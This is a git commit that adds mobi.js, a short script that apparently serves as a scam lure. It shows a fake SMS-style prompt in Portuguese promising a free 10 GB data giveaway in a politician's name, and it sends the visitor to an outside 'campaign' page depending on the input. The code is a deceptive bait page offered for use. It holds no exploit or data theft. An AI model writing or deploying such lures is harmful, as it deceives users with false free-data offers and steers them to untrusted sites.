50556ea7071765a326daa91d2229503368957302
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-09-28 11:41:21 +0530

    Add files via upload

---
+++ mobi.js
@@ -0,0 +1,6 @@
+
+var password = 'ATIVE 10 GB'
+password=prompt('SMS: Olá, você foi selecionado para se beneficiar do DANIEL CHAPO Free Data Giveaway para seus apoiadores. Pressione OK para ativar agora ','ATIVE 10 GB');
+if (password != 'ATIVE 10 GB') {
+location.href='https://zaget.cc/10gb-campaign.html';
+}
